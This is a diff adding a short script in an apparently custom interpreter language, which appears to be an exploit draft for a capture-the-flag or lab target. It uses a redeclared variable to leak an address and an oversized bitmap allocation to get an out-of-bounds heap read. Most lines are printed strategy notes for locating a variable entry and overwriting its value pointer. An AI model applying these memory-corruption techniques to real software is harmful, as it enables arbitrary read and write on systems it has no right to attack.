@@ -1,0 +1,31 @@
+print("=== Finding Variable Entry Address ===");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("Creating bitmap for OOB read");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Strategy: Scan backwards from targetaddr");
+print("Look for target name pattern");
+print("Variable entry has name at offset 0x00");
+
+print("Estimating entry address");
+print("Common offsets: 0x100, 0x200, 0x300, 0x400");
+print("entry_addr ≈ targetaddr - 0x300");
+
+print("To find exact address:");
+print("1. Use OOB read to scan heap");
+print("2. Look for target string at offset 0x00");
+print("3. When found, that address is entry_addr");
+print("4. value_ptr = entry_addr + 0x28");
+
+print("Alternative: Try writing to estimated address");
+print("If target variable changes, we found it!");
+
+print("Note: This requires knowing bitmap_data_ptr too");
+print("bitmap_data_ptr is the bitmap buffer address");
+
